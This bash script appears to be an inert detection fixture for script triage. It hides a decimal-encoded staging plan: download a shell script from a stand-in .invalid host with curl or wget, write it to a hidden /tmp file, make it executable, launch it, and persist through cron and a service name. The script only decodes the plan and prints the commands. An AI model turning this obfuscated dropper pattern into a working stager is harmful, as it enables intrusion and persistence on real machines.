# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_e9fa1471='118 61 49 124 115 116 101 112 115 61 112 114 111 102 105 108 101 95 104 111 115 116 44 97 99 113 117 105 114 101 95 114 101 109 111 116 101 44 119 114 105 116 101 95 102 105 108 101 44 99 104 97 110 103 101 95 109 111 100 101 44 100 105 115 112 97 116 99 104 95 112 114 111 99 101 115 115 124 97 100 97 112 116 101 114 61 99 117 114 108 95 97 114 99 104 95 102 97 108 108 98 97 99 107 124 115 116 97 103 101 95 99 111 117 110 116 61 53 124 99 97 109 112 97 105 103 110 95 105 100 61 99 97 109 112 97 105 103 110 45 54 97 101 55 101 50 56 97 57 98 124 117 114 108 61 104 116 116 112 115 58 47 47 54 97 101 55 101 50 56 97 57 98 46 101 120 97 109 112 108 101 46 105 110 118 97 108 105 100 47 98 98 98 99 49 52 52 51 46 115 104 124 117 115 101 114 95 97 103 101 110 116 61 72 117 110 116 114 101 115 115 76 97 98 47 54 97 101 55 101 50 56 97 57 98 124 102 105 108 101 95 112 97 116 104 61 47 116 109 112 47 104 117 110 116 114 101 115 115 45 99 97 99 104 101 47 46 115 116 97 103 101 45 54 97 101 55 101 50 56 97 57 98 124 97 114 99 104 95 112 114 111 98 101 61 117 110 97 109 101 45 109 124 115 101 114 118 105 99 101 95 110 97 109 101 61 117 112 100 97 116 101 45 54 97 101 55 101 50 56 97 57 98 46 115 101 114 118 105 99 101 124 99 114 111 110 95 112 97 116 104 61 47 101 116 99 47 99 114 111 110 46 100 47 117 112 100 97 116 101 45 54 97 101 55 101 50 56 97 57 98'
readonly Codec_e9fa1471='decimal_space|identity|'

Load_e9fa1471() {
  item1=()
  local IFS=' '
  read -r -a item1 <<< "${Material_e9fa1471}"
}

Decode_e9fa1471() {
  item2=()
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("${item1[item5]}")
  done
}

Recover_e9fa1471() {
  local -a item1 item2
  local item3 item4 item8 item5
  item4=$((19 * 7 - 133))
  Load_e9fa1471
  if ! Decode_e9fa1471; then return 71; fi
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_e9fa1471() { local recovered field; local -a fields; recovered="$(Recover_e9fa1471)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_e9fa1471() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_e9fa1471)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_e9fa1471; fi

# reconstruction complete